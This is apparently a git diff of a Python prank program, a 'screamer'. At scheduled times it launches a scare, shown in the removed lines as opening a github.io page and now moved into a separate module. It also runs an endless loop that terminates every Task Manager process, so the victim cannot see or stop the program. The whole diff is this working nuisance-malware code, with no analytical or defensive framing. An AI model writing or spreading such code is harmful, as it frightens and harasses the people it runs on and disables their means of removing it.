@@ -1,13 +1,8 @@
 from threading import Thread
-from time import sleep
 import psutil
-from config import ACTIVATE
+from config import *
 import datetime
-import os
-
-
-def run_screammer():
-    os.popen("start https://scrinshoted.github.io/")
+import screamer
 
 
 def match_time(time: datetime.time, template: str):
@@ -34,17 +29,16 @@ def scream():
             if not match_time(time, ACTIVATE[i][0]): continue
             ACTIVATE[i][1] = True
 
-            run_screammer()
+            screamer.run()
 
 
 def taskmgr_kill():
     while True:
         for process in psutil.process_iter(['pid', 'name']):
             try:
-                if process.info['name'] == "Taskmgr.exe":  # Имя процесса может быть "Telegram.exe" для Windows
-                    process.terminate()  # Завершение процесса
+                if process.info['name'] != "Taskmgr.exe": continue
+                process.terminate()
             except (psutil.NoSuchProcess, psutil.AccessDenied):
-            # Если процесс уже завершен или доступ к нему запрещен
                 continue
 
 
